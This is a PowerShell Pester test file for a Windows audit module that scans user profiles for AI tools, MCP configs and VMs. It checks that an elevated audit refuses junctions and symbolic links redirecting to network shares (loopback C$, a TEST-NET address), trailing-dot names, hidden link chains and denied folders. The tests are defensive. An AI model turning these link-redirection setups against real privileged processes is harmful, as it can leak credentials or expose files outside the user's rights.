        # Every reason the layer writes is a fixed string: none is built from an exception's message.
        $src = Get-Content (Join-Path $script:RepoRoot 'src\CEAudit\Private\15-ProfileReads.ps1') -Raw
        $src | Should -Not -Match 'Reason[^\r\n]*Exception\.Message'
        $src | Should -Not -Match 'why = [^\r\n]*Exception\.Message'
    }

    It 'keeps the rights level in the cache keys, so a result from one context is not reused in another' {
        InModuleScope CEAudit {
            $t = Get-Date
            Mock Get-CEAIToolStateUncached { [pscustomobject]@{ Tools = @(); UninspectedProcesses = @(); NotRead = @(); From = [bool]$Context.IsSystem } }
            Mock Get-CEVirtualisationStateUncached { [pscustomobject]@{ From = [bool]$Context.IsSystem } }
            $script:CEAIToolCache = $null
            $script:CEVirtualisationCache = $null
            foreach ($sys in $true, $false) {
                $ctx = [pscustomobject]@{ ComputerName = 'C1'; AuditTime = $t; IsElevated = $true; IsSystem = $sys }
                (Get-CEAIToolState -Context $ctx).From | Should -Be $sys
                (Get-CEVirtualisationState -Context $ctx).From | Should -Be $sys
            }
            $script:CEAIToolCache = $null
            $script:CEVirtualisationCache = $null
        }
    }

    It 'relies on Windows refusing a junction whose target names another computer (loopback only)' {
        # The premise of SECURITY.md statement 1: NTFS stores such a target, but Windows will not follow it, whether
        # it names the network path directly or through a drive letter defined for it, and never connects.
        $root = Join-Path $TestDrive 'layer-p1'
        New-Item -ItemType Directory -Force -Path $root | Out-Null
        $used = @([IO.DriveInfo]::GetDrives() | ForEach-Object { $_.Name.Substring(0, 2).ToUpperInvariant() })
        $letter = @('Q:', 'R:', 'S:', 'T:', 'U:', 'V:', 'W:' | Where-Object { $used -notcontains $_ })[0]
        $raw = '\Device\Mup\127.0.0.1\C$'
        $targets = [ordered]@{ unc = '\??\UNC\127.0.0.1\C$\Windows'; mup = '\Device\Mup\127.0.0.1\C$\Windows'; globalroot = '\??\GLOBALROOT\Device\Mup\127.0.0.1\C$\Windows'; drive = "\??\$letter\Windows" }
        $made = New-Object System.Collections.ArrayList
        [CETest.MountPoint]::Define($letter, $raw) | Should -Be 0
        try {
            foreach ($k in $targets.Keys) {
                $j = Join-Path $root $k
                New-Item -ItemType Directory -Path $j | Out-Null
                [void]$made.Add($j)
                [CETest.MountPoint]::Set($j, $targets[$k]) | Should -Be 0 -Because "NTFS stores the $k target"
                [CETest.MountPoint]::ListError($j) | Should -Be 4392 -Because "Windows does not follow a junction to $k (ERROR_INVALID_REPARSE_DATA)"
            }
            Use-TestTags
            InModuleScope CEAudit -Parameters @{ M = @($made); Bad = $global:CETestJunctionBad } {
                param($M, $Bad)
                foreach ($j in $M) { Get-CEJunctionProblem -Path $j -Log (New-CENotReadLog) | Should -Be $Bad -Because $j }
            }
        }
        finally {
            foreach ($j in $made) { [IO.Directory]::Delete($j) }
            [void][CETest.MountPoint]::Undefine($letter, $raw)
        }
    }

    It 'refuses a junction whose local target passes through a real symbolic link to another computer, before following anything' {
        # Design test P2. The junction's stored target is a local folder, but a folder on the way to it is a real
        # directory symbolic link to a network path (192.0.2.1, TEST-NET-1, which never answers). The gate must stop
        # at the link from its attributes and tag alone: nothing below it is looked at, and nothing is listed or read
        # through the junction. Needs the right to create symbolic links: it runs in the Windows Sandbox CI.
        if (-not ('CETest.SymLink' -as [type])) {
            Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
namespace CETest {
    public static class SymLink {
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.I1)]
        static extern bool CreateSymbolicLinkW(string link, string target, uint flags);
        // SYMBOLIC_LINK_FLAG_DIRECTORY | ALLOW_UNPRIVILEGED_CREATE. Nothing checks, or opens, the target.
        public static int NewDirectory(string link, string target) { return CreateSymbolicLinkW(link, target, 0x1 | 0x2) ? 0 : Marshal.GetLastWin32Error(); }
    }
}
'@
        }
        $root = Join-Path $TestDrive 'layer-p2'
        $p = Join-Path $root 'profile'
        $j = Join-Path $p 'x'
        $link = Join-Path $root 'T\link'
        New-Item -ItemType Directory -Force -Path $j, (Join-Path $root 'T') | Out-Null
        $err = [CETest.SymLink]::NewDirectory($link, '\\192.0.2.1\share')
        if ($err -ne 0) { Set-ItResult -Skipped -Because "this account can't create symbolic links (Win32 error $err)"; return }
        try {
            # Set as stored, so nothing checks (and so follows) the target while the test sets it up.
            [CETest.MountPoint]::Set($j, ('\??\' + (Join-Path $link 'real'))) | Should -Be 0
            Use-TestTags -Record
            $global:CETestRealJunctionTarget = & (Get-Module CEAudit) { ${function:Get-CEJunctionTarget} }
            Mock -ModuleName CEAudit Get-CEJunctionTarget { [void]$global:CETestLooked.Add("target:$(([string]$Path).ToLowerInvariant())"); & $global:CETestRealJunctionTarget -Path $Path }
            $r = InModuleScope CEAudit -Parameters @{ P = $p } {
                param($P)
                $log = New-CENotReadLog
                $names = Get-CEProfileChildName -ProfilePath $P -Relative 'x' -Max 10 -Log $log -Above $true -Topic 't'   # assign first: it returns ,array
                $exists = Test-CEProfileItem -ProfilePath $P -Relative 'x\y' -Log $log -Above $true -Topic 't'
                $text = Read-CEProfileFile -ProfilePath $P -Relative 'x\y.json' -MaxBytes 1KB -Log $log -Above $true -Topic 't'
                [pscustomobject]@{ Names = @($names); Exists = $exists; Text = $text; Records = @($log.Records | ForEach-Object { "$($_.Location)|$($_.Kind)|$($_.Reason)|$($_.NeedsUserSession)" }) }
            }
            @($r.Names).Count | Should -Be 0
            $r.Exists | Should -BeNullOrEmpty -Because 'whether anything is there is not known, not "no"'
            $r.Text | Should -BeNullOrEmpty
            @($r.Records) | Should -Be @(
                "%USERPROFILE%\x|folder-listing|$global:CETestJunctionBad|True",
                "%USERPROFILE%\x\y|existence|$global:CETestJunctionBad|True",
                "%USERPROFILE%\x\y.json|file-content|a junction or symbolic link on the way is not followed when reading file contents above the user's rights|True")
            # The link was judged by its own attributes and tag; nothing below it, or through the junction, was looked at.
            $linkKey = $link.ToLowerInvariant()
            @($global:CETestLooked) | Should -Contain $linkKey
            @($global:CETestLooked | Where-Object { $_.StartsWith("$linkKey\") -or $_.StartsWith("$($j.ToLowerInvariant())\") }) | Should -BeNullOrEmpty
            @($global:CETestLooked | Where-Object { $_ -like 'target:*' }) | Should -Be @("target:$($j.ToLowerInvariant())") -Because 'only the junction''s own target is read, once'
        }
        finally {
            # The links themselves, never what they point to.
            if ([IO.Directory]::Exists($j)) { [IO.Directory]::Delete($j) }
            [IO.Directory]::Delete($link)
        }
    }

    It 'refuses a junction whose target is not a local folder it can check, or loops' {
        $root = Join-Path $TestDrive 'layer-targets'
        $p = Join-Path $root 'profile'
        New-TestJunction -Path (Join-Path $p 'x') -Target (Join-Path $root 'real')
        Use-TestTags
        $r = InModuleScope CEAudit -Parameters @{ P = $p; Self = ('\??\' + (Join-Path $p 'x')) } {
            param($P, $Self)
            $out = [ordered]@{}
            $script:testTarget = ''
            Mock Get-CEJunctionTarget { $script:testTarget }
            Mock Test-CELocalFilePath { $Path -match '^[A-Ya-y]:\\' }   # Z: stands for a drive that is not fixed
            foreach ($t in '\??\UNC\host\share\x', '\Device\Mup\host\x', '\??\GLOBALROOT\Device\Mup\host\x', '\??\C:\a\..\b', '\??\C:\a\b.', '\??\C:\a\b ', '\??\Z:\x', $Self, '') {
                $script:testTarget = $t
                $log = New-CENotReadLog
                $n = Get-CEProfileChildName -ProfilePath $P -Relative 'x' -Max 10 -Log $log -Above $true -Topic 't'
                $out[$t] = "$(@($n).Count)|$(@($log.Records | ForEach-Object { "$($_.Kind)|$($_.Reason)" }) -join ';')"
            }
            $out
        }
        foreach ($t in $r.Keys) { $r[$t] | Should -Be "0|folder-listing|$global:CETestJunctionBad" -Because "the target is '$t'" }
    }

    It 'follows junctions that name junctions at most 8 deep' {
        # Its own It: the one before mocks Get-CEJunctionTarget for the rest of it.
        $root = Join-Path $TestDrive 'layer-depth'
        $p = Join-Path $root 'profile'
        New-Item -ItemType Directory -Force -Path $p | Out-Null
        Use-TestTags
        # Real junctions, each naming the next.
        $chain = {
            param([string]$Name, [int]$Count)
            $base = Join-Path $root $Name
            New-Item -ItemType Directory -Force -Path (Join-Path $base 'real\sub') | Out-Null
            $next = Join-Path $base 'real'
            for ($i = $Count; $i -ge 1; $i--) { New-TestJunction -Path (Join-Path $base "j$i") -Target $next; $next = Join-Path $base "j$i" }
            New-TestJunction -Path (Join-Path $p $Name) -Target $next
        }
        & $chain 'seven' 7
        & $chain 'eight' 8
        $depth = InModuleScope CEAudit -Parameters @{ P = $p } {
            param($P)
            foreach ($n in 'seven', 'eight') {
                $names = Get-CEProfileChildName -ProfilePath $P -Relative $n -Max 10 -Log (New-CENotReadLog) -Above $true -Topic 't'   # assign first: it returns ,array
                "$n=$(@($names) -join ',')"
            }
        }
        @($depth) | Should -Be @('seven=sub', 'eight=')
    }

    It 'checks the names in a junction''s target as the kernel follows them, not as Windows would rewrite them' {
        # 'foo.' is a junction to another computer, next to a plain 'foo'. Windows' path rules read 'foo.' as 'foo',
        # but the kernel follows a junction's target as stored.
        $root = Join-Path $TestDrive 'layer-dot'
        $p = Join-Path $root 'profile'
        $j = Join-Path $p 'x'
        New-Item -ItemType Directory -Force -Path $j, (Join-Path $root 'foo') | Out-Null
        $dot = '\\?\' + (Join-Path $root 'foo.')
        [void][IO.Directory]::CreateDirectory($dot)
        try {
            [CETest.MountPoint]::Set($dot, '\??\UNC\127.0.0.1\C$\Windows') | Should -Be 0
            [CETest.MountPoint]::Set($j, ('\??\' + (Join-Path $root 'foo.'))) | Should -Be 0
            Use-TestTags
            InModuleScope CEAudit -Parameters @{ P = $p; J = $j; Dot = $dot; Bad = $global:CETestJunctionBad } {
                param($P, $J, $Dot, $Bad)
                Get-CEJunctionProblem -Path $Dot -Log (New-CENotReadLog) | Should -Be $Bad
                Get-CEJunctionProblem -Path $J -Log (New-CENotReadLog) | Should -Be $Bad -Because "its target is foo., not the plain foo beside it"
                $log = New-CENotReadLog
                $names = Get-CEProfileChildName -ProfilePath $P -Relative 'x' -Max 10 -Log $log -Above $true -Topic 't'   # assign first: it returns ,array
                @($names).Count | Should -Be 0
                @($log.Records | ForEach-Object { "$($_.Location)|$($_.Reason)" }) | Should -Be @("%USERPROFILE%\x|$Bad")
                # The walk itself uses the names as stored: a \\?\ path reaches foo., and its tag is read, not skipped as a wildcard.
                (Get-CEItemPresence -Path $Dot).State | Should -Be 'present'
                Get-CEReparseKind -Item (Get-CEItemPresence -Path $Dot) | Should -Be 'junction'
            }
        }
        finally {
            [IO.Directory]::Delete($j)
            [IO.Directory]::Delete($dot)
        }
    }

    It 'refuses a junction whose target passes a folder the audit may not look at, which could hide a link' {
        # .vscode\extensions -> T\hidden\s -> T\X, where T\X stands for a symbolic link. Denying this account List on
        # T\hidden and ReadAttributes on s itself makes s look missing to DirectoryInfo.Exists; Windows still follows it.
        $root = Join-Path $TestDrive 'layer-hidden'
        $p = Join-Path $root 'profile'
        New-Item -ItemType Directory -Force -Path (Join-Path $p '.vscode'), (Join-Path $root 'elsewhere\github.copilot-9.9.9') | Out-Null
        New-TestJunction -Path (Join-Path $root 'T\X') -Target (Join-Path $root 'elsewhere')
        New-TestJunction -Path (Join-Path $root 'T\hidden\s') -Target (Join-Path $root 'T\X')
        New-TestJunction -Path (Join-Path $p '.vscode\extensions') -Target (Join-Path $root 'T\hidden\s')
        Use-TestTags @{ (Join-Path $root 'T\X') = $global:CETagSymlink }
        $list = {
            InModuleScope CEAudit -Parameters @{ P = $p } {
                param($P)
                $log = New-CENotReadLog
                $n = Get-CEProfileChildName -ProfilePath $P -Relative '.vscode\extensions' -Max 10 -Log $log -Above $true -Topic 'vscode'
                [pscustomobject]@{ Names = @($n); Records = @($log.Records | ForEach-Object { "$($_.Location)|$($_.Reason)" }) }
            }
        }
        $bad = "%USERPROFILE%\.vscode\extensions|$global:CETestJunctionBad"
        $r = & $list
        @($r.Names).Count | Should -Be 0
        @($r.Records) | Should -Be @($bad)
        $hidden = Join-Path $root 'T\hidden'
        $s = Join-Path $hidden 's'
        Set-TestDeny -Path $s -Rights 'RA' -Link
        Set-TestDeny -Path $hidden -Rights 'RD'
        try {
            $r = & $list
            @($r.Names).Count | Should -Be 0 -Because 'a folder on the way to the target that the audit may not look at could be a link'
            @($r.Records) | Should -Be @($bad)
        }
        finally {
            Set-TestDeny -Path $hidden -Remove
            Set-TestDeny -Path $s -Link -Remove
        }
    }

    It 'records folders and files the audit may not look at, not taking them as missing: SC-09, FW-07 and SC-13 are Manual' {
        $p = Join-Path $TestDrive 'layer-denied'
        New-Item -ItemType Directory -Force -Path (Join-Path $p '.vscode\extensions\pub.ext-1.0.0'), (Join-Path $p 'AppData\Roaming\VMware'), (Join-Path $p 'AppData\Local\Vendor\Tool'), (Join-Path $p '.cursor') | Out-Null
        $vmx = Join-Path $p 'VMs\lab.vmx'
        New-Item -ItemType Directory -Force -Path (Split-Path -Parent $vmx) | Out-Null
        Set-Content -LiteralPath $vmx -Value @('displayName = "Lab"', 'ethernet0.present = "TRUE"', 'ethernet0.connectionType = "bridged"')
        Set-Content -LiteralPath (Join-Path $p 'AppData\Roaming\VMware\inventory.vmls') -Value "vmlist1.config = `"$vmx`""
        Set-Content -LiteralPath (Join-Path $p '.cursor\mcp.json') -Value '{ "mcpServers": { "gh": { "command": "npx" } } }' -Encoding ASCII
        $catalog = '{ "schemaVersion": 2, "tools": [ { "id": "t-code", "name": "Code tool", "canActOnDevice": false, "windows": { "vscodeExtensions": [ "pub.ext-*" ], "paths": [ "AppData\\Local\\Vendor\\Tool" ], "mcpConfigs": [ { "path": ".cursor\\mcp.json" } ] } } ] }'
        $scan = {
            param([bool]$Above)
            InModuleScope CEAudit -Parameters @{ P = $p; Cat = $catalog; Above = $Above; C = $global:CETestMcpCtx } {
                param($P, $Cat, $Above, $C)
                (Get-CEConfig)['ai-tools'] = ($Cat | ConvertFrom-Json)
                $script:layerProfile = $P
                Mock Get-CEUserProfilePath { $script:layerProfile }
                Mock Get-CEInstalledSoftware { @() }
                Mock Get-CEStorePackageName { , @() }
                Mock Get-CEVsCodeBuiltInExtensionDir { , @() }
                Mock Get-CEProcessList { , @() }
                Mock Get-CEWslDistribution { , @() }
                Mock Get-CEHyperVMachine { [pscustomobject]@{ Readable = $true; Message = ''; Machines = @(); NatMappings = @() } }
                Mock Get-CEContainer { , @() }
                Mock Resolve-CEDockerPath { [pscustomobject]@{ Path = ''; Refused = @() } }
                Mock Get-CEVirtualisationListener { , @() }
                $ctx = [pscustomobject]@{ IsSystem = $false; IsElevated = $Above }
                [pscustomobject]@{
                    AI   = Get-CEAIToolStateUncached -Context $ctx
                    Virt = Get-CEVirtualisationStateUncached -Context $ctx
                    Mcp  = Get-CEMcpInventory -Context (& $C $false $Above "D$Above$([guid]::NewGuid())")
                }
            }
        }
        $before = & $scan $true
        @($before.AI.Tools).Count | Should -Be 1
        @($before.Virt.VMware | ForEach-Object { $_.Name }) | Should -Be @('Lab')
        $before.Mcp.mcpConfigsFound | Should -Be 1
        @($before.AI.NotRead).Count + @($before.Virt.NotRead).Count + @($before.Mcp.mcpConfigsUnreadable).Count | Should -Be 0
        $denies = @(@{ Path = '.vscode'; Rights = 'RD' }, @{ Path = '.vscode\extensions'; Rights = 'RA' }, @{ Path = 'AppData\Local\Vendor'; Rights = 'RD' }, @{ Path = 'AppData\Local\Vendor\Tool'; Rights = 'RA' },
            @{ Path = 'AppData\Roaming\VMware'; Rights = 'RD' }, @{ Path = 'AppData\Roaming\VMware\inventory.vmls'; Rights = 'RA' }, @{ Path = '.cursor'; Rights = 'RD' }, @{ Path = '.cursor\mcp.json'; Rights = 'RA' })
        $done = New-Object System.Collections.ArrayList
        try {
            foreach ($d in $denies) { Set-TestDeny -Path (Join-Path $p $d.Path) -Rights $d.Rights; [void]$done.Add((Join-Path $p $d.Path)) }
            $why = 'it could not be read (UnauthorizedAccessException)'
            foreach ($above in $true, $false) {
                $st = & $scan $above
                @($st.AI.Tools).Count | Should -Be 0
                @($st.AI.NotRead | ForEach-Object { "$($_.Topic)|$($_.Kind)|$($_.Location)|$($_.Reason)|$($_.NeedsUserSession)" }) | Should -Be @(
                    "vscode|folder-listing|%USERPROFILE%\.vscode\extensions|$why|False", "paths|existence|%USERPROFILE%\AppData\Local\Vendor\Tool|$why|False") -Because "above the user's rights: $above"
                @($st.Virt.VMware).Count | Should -Be 0
                @($st.Virt.NotRead | ForEach-Object { "$($_.Topic)|$($_.Kind)|$($_.Location)|$($_.Reason)" }) | Should -Be @("vm-inventory|file-content|%USERPROFILE%\AppData\Roaming\VMware\inventory.vmls|$why")
                $st.Mcp.mcpConfigsFound | Should -Be 0 -Because 'a config that could not be looked at is not counted as found'
                @($st.Mcp.mcpConfigsUnreadable | ForEach-Object { "$($_.path)|$($_.kind)|$($_.reason)|$($_.needsUserSession)" }) | Should -Be @(".cursor\mcp.json|existence|$why|False")
            }
        }
        finally { foreach ($d in $done) { Set-TestDeny -Path $d -Remove } }
        Set-TestLayerAI -NotRead @($st.AI.NotRead)
        $f = @(Invoke-CEAuditCore -Id 'SC-09' | Where-Object Subject -eq 'Not read')
        @($f | ForEach-Object Status) | Should -Be @('Manual')
        $f[0].Recommendation | Should -Match 'Check the permissions on this folder'
        $f[0].Recommendation | Should -Not -Match 'without elevation|symbolic link' -Because "running as the user is not what these records need"
        $global:CETestVirt = $st.Virt
        Mock -ModuleName CEAudit Get-CEVirtualisationState { $global:CETestVirt }
        @(Invoke-CEAuditCore -Id 'FW-07' | ForEach-Object Status) | Should -Be @('Manual')
        $global:CETestMcp = $st.Mcp
        Mock -ModuleName CEAudit Get-CEMcpInventory { $global:CETestMcp }
        $f = @(Invoke-CEAuditCore -Id 'SC-13')
        $f[0].Status | Should -Be 'Manual'
        $f[0].Actual | Should -Match 'could not be checked: \.cursor\\mcp\.json'
    }

    It 'reads package.json of the per-user VS Code install only through plain folders, and records the rest once per folder' {
        $root = Join-Path $TestDrive 'layer-vscode-pkg'
        $p = Join-Path $root 'profile'
        $ext = Join-Path $root 'install\resources\app\extensions'
        New-Item -ItemType Directory -Force -Path (Join-Path $ext 'copilot'), (Join-Path $ext 'other') | Out-Null
        Set-Content -LiteralPath (Join-Path $ext 'copilot\package.json') -Value '{ "name": "copilot-chat", "publisher": "GitHub" }' -Encoding ASCII
        Set-Content -LiteralPath (Join-Path $ext 'other\package.json') -Value '{ "name": "o", "publisher": "p" }' -Encoding ASCII
        # The commit-hash folder of the per-user install is a junction: names are listed through it, contents never read.
        New-TestJunction -Path (Join-Path $p 'AppData\Local\Programs\Microsoft VS Code\h1') -Target (Join-Path $root 'install')
        Use-TestTags
        $st = InModuleScope CEAudit -Parameters @{ P = $p } {
            param($P)
            (Get-CEConfig)['ai-tools'] = ('{ "schemaVersion": 2, "tools": [ { "id": "t-copilot", "name": "Copilot test", "canActOnDevice": false, "windows": { "vscodeExtensions": [ "copilot", "github.copilot-chat-*" ] } } ] }' | ConvertFrom-Json)
            $script:layerProfile = $P
            Mock Get-CEUserProfilePath { $script:layerProfile }
            Mock Get-CEProgramFilesPath { $null }   # only the per-user install, whatever this machine has in Program Files
            Mock Get-CEInstalledSoftware { @() }
            Mock Get-CEStorePackageName { , @() }
            Mock Get-CEProcessList { , @() }
            [pscustomobject]@{
                Elevated = Get-CEAIToolStateUncached -Context ([pscustomobject]@{ IsSystem = $false; IsElevated = $true })
                System   = Get-CEAIToolStateUncached -Context ([pscustomobject]@{ IsSystem = $true; IsElevated = $true })
                User     = Get-CEAIToolStateUncached -Context ([pscustomobject]@{ IsSystem = $false; IsElevated = $false })
            }
        }
        $loc = '%USERPROFILE%\AppData\Local\Programs\Microsoft VS Code\h1\resources\app\extensions'
        $why = 'a junction or symbolic link on the way is not followed when reading file contents above the user''s rights'
        foreach ($how in 'Elevated', 'System') {
            @($st.$how.Tools[0].Signals) | Should -Be @('VS Code built-in extension: copilot') -Because "$how does not read package.json through the junction, so the folder name stands"
            @($st.$how.NotRead | ForEach-Object { "$($_.Topic)|$($_.Kind)|$($_.Location)|$($_.Reason)|$($_.NeedsUserSession)|$($_.Count)" }) | Should -Be @("vscode-builtin|file-content|$loc|$why|True|2") -Because $how
        }
        @($st.User.Tools[0].Signals) | Should -Be @('VS Code built-in extension: github.copilot-chat') -Because "the user's own session reads through their junction"
        @($st.User.NotRead).Count | Should -Be 0
        Set-TestLayerAI -Tools @($st.Elevated.Tools) -NotRead @($st.Elevated.NotRead)
        @(Invoke-CEAuditCore -Id 'UA-07' | Where-Object Subject -eq 'Not read').Status | Should -Be 'Info'
    }

    It 'gives each record the advice it needs, and keeps UA-07 and SC-09 when only a browser could not be checked' {
        $perm = [ordered]@{ Location = '%USERPROFILE%\AppData\Local\Vendor\Tool'; Kind = 'existence'; Reason = 'it could not be read (UnauthorizedAccessException)'
            Remedy = 'Check the permissions on this folder, then run the audit again.'; Topic = 'paths'; NeedsUserSession = $false; Count = 1 }
        $cap = [ordered]@{ Location = '%USERPROFILE%\AppData\Roaming\VMware\inventory.vmls'; Kind = 'file-content'; Reason = 'the audit reads at most 64 virtual machine files named in one inventory above the user''s rights'
            Remedy = 'Or raise maxVmFilesPerInventory in virtualisation.json.'; Topic = 'vm-file'; NeedsUserSession = $true; Count = 1 }
        $link = [ordered]@{ Location = '%USERPROFILE%\VMs\a.vmx'; Kind = 'file-content'; Reason = 'a junction or symbolic link on the way is not followed when reading file contents above the user''s rights'
            Remedy = ''; Topic = 'vm-file'; NeedsUserSession = $true; Count = 1 }
        InModuleScope CEAudit -Parameters @{ Perm = $perm; Cap = $cap; Link = $link } {
            param($Perm, $Cap, $Link)
            (New-CENotReadResult -Records @($Perm) -Scope Machine -Expected 'x').Recommendation | Should -Be 'Check the permissions on this folder, then run the audit again.'
            $r = (New-CENotReadResult -Records @($Cap) -Scope Machine -Expected 'x').Recommendation
            $r | Should -Not -Match 'symbolic link' -Because 'the cap is not about links'
            $r | Should -Match '^To read these, run the full audit without elevation.*Or raise maxVmFilesPerInventory'
            $r = (New-CENotReadResult -Records @($Link, $Perm) -Scope Machine -Expected 'x').Recommendation
            $r | Should -Match "never reads a file's contents through a junction or symbolic link"
            $r | Should -Match 'To read those skipped because the audit ran with more rights than the user, run the full audit'
            $r | Should -Match 'Check the permissions on this folder'
        }
        # The report says the same: no elevation advice for a record that running as the user would not read.
        Set-TestLayerAI -NotRead @($perm)
        $rep = Export-CEReport -Findings @(Invoke-CEAuditCore -Id 'SC-09') -Context (New-TestContext) -OutputPath (Join-Path $TestDrive 'layer-advice')
        foreach ($text in (Get-Content $rep.Paths.Markdown -Raw), (Get-Content $rep.Paths.Html -Raw)) {
            $text | Should -Match 'Check the permissions on this folder'
            $text | Should -Not -Match 'without elevation while signed in as that user'
        }
        # Only a browser's installed marker could not be checked: its tools and their services are kept, so SC-09 and
        # UA-07 miss nothing, and the report lists what is actually unknown.
        $claude = [pscustomobject]@{ Id = 'claude-code'; Name = 'Claude Code'; Service = 'Anthropic (Claude)'; CanActOnDevice = $false; Notes = ''; Signals = @('Google Chrome extension: x'); Processes = @(); LeftoverOnly = $false }
        $bi = [ordered]@{ Location = '%USERPROFILE%\AppData\Local\Google\Chrome\Application\chrome.exe'; Kind = 'existence'
            Reason = 'a symbolic link on the way is not followed by an elevated or SYSTEM audit (it could point off this computer)'; Remedy = ''; Topic = 'browser-installed'; NeedsUserSession = $true; Count = 1 }
        Set-TestLayerAI -Tools @($claude) -NotRead @($bi)
        @(Invoke-CEAuditCore -Id 'UA-07' | Where-Object Subject -eq 'Not read').Count | Should -Be 0
        @(Invoke-CEAuditCore -Id 'UA-07' | Where-Object Subject -eq 'Anthropic (Claude)').Count | Should -Be 1
        @(Invoke-CEAuditCore -Id 'SC-09' | Where-Object Subject -eq 'Not read').Count | Should -Be 0
        $rep = Export-CEReport -Findings @(Invoke-CEAuditCore -Id 'SC-09') -Context (New-TestContext) -OutputPath (Join-Path $TestDrive 'layer-browser-installed')
        $md = Get-Content $rep.Paths.Markdown -Raw
        $html = Get-Content $rep.Paths.Html -Raw
        $browserLead = 'Whether these browsers are still installed could not be checked, so the AI extensions found in their profiles are listed as installed, though they may be left over from a browser that was removed'
        $md | Should -Match ([regex]::Escape("${browserLead}:$([Environment]::NewLine)$([Environment]::NewLine)- %USERPROFILE%\AppData\Local\Google\Chrome\Application\chrome.exe"))
        $md | Should -Match ([regex]::Escape('- Claude Code - present'))
        $html | Should -Match ([regex]::Escape("$browserLead.</div><ul><li>%USERPROFILE%\AppData\Local\Google\Chrome\Application\chrome.exe"))
        foreach ($text in $md, $html) {
            $text | Should -Not -Match 'could hide an AI tool|may be incomplete' -Because 'the record hides no AI tool; what is unknown is whether the browser is still installed'
        }
        # With another record as well, each is listed under its own explanation.
        $vm = [ordered]@{ Location = '%USERPROFILE%\VMs\a.vmx'; Kind = 'file-content'; Reason = 'it could not be read (IOException)'; Remedy = ''; Topic = 'vm-file'; NeedsUserSession = $false; Count = 1 }
        Set-TestLayerAI -Tools @($claude) -NotRead @($bi, $vm)
        $rep = Export-CEReport -Findings @(Invoke-CEAuditCore -Id 'SC-09') -Context (New-TestContext) -OutputPath (Join-Path $TestDrive 'layer-browser-installed-mixed')
        $md = Get-Content $rep.Paths.Markdown -Raw
        $html = Get-Content $rep.Paths.Html -Raw
        $md | Should -Match ('None of them could hide an AI tool[^\r\n]*:\s+- ' + [regex]::Escape('%USERPROFILE%\VMs\a.vmx (file not read)') + '[^\r\n]*\s+' + [regex]::Escape("${browserLead}:") + '\s+- ' + [regex]::Escape('%USERPROFILE%\AppData\Local\Google\Chrome\Application\chrome.exe'))
        $html | Should -Match ('None of these could hide an AI tool[^<]*</div><ul><li>' + [regex]::Escape('%USERPROFILE%\VMs\a.vmx') + '[^<]*</li></ul><div[^>]*>' + [regex]::Escape("$browserLead.") + '</div><ul><li>' + [regex]::Escape('%USERPROFILE%\AppData\Local\Google\Chrome\Application\chrome.exe'))
    }

    It 'SECURITY.md says what the read layer does, and no longer what it did' {
        $text = (Get-Content (Join-Path $script:RepoRoot 'SECURITY.md') -Raw) -replace '\s+', ' '
        foreach ($claim in @(
                'only after reading the junction''s target without following it',
                'Symbolic links, other name-surrogate reparse points, and reparse points whose tag cannot be read are not followed, even for listing',
                'are never opened through any junction or symbolic link anywhere on the path',
                'MCP configs 16 MB',
                'In the user''s own non-elevated session, links are followed as usual',
                'Nothing skipped is dropped silently',
                'more rights than the account that owns the profile',
                'not as Windows'' path rules would rewrite them',
                'a folder on the way whose attributes the tool may not read is refused, not taken as missing',
                'the profile folder itself may be a link, as profile containers and moved profiles are',
                'a virtual machine file outside the profile is shown as the inventory names it',
                'Only what Windows says is not there counts as missing')) {
            $text | Should -Match ([regex]::Escape($claim)) -Because $claim
        }
        $text | Should -Not -Match 'a standard user''s links could otherwise steer'
        $text | Should -Not -Match 'must be a plain folder, not a junction or symbolic link'
    }
}
